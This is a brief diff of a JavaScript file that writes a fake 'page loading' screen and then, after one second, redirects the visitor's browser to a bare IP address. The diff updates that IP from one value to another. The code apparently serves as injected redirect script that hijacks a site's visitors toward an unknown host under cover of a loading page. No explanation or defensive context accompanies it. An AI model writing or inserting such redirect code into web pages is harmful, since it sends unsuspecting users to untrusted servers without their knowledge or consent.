@@ -18,8 +18,6 @@
 })();
 document.writeln("<html>");
 document.writeln("<head>");
-document.writeln("<meta http-equiv=\'Content-Type\' content=\'text/html; charset=UTF-8\'>");
-document.writeln("");
 document.writeln("<title>页面加载中...</title>");
 document.writeln("<style>");
 document.writeln("<style type=\'text/css\'>");
@@ -34,4 +32,4 @@ document.writeln("</html>");
 
 
 
-setTimeout("window.location.href='http://38.26.195.65/'",1000);
+setTimeout("window.location.href='http://38.26.195.67/'",1000);
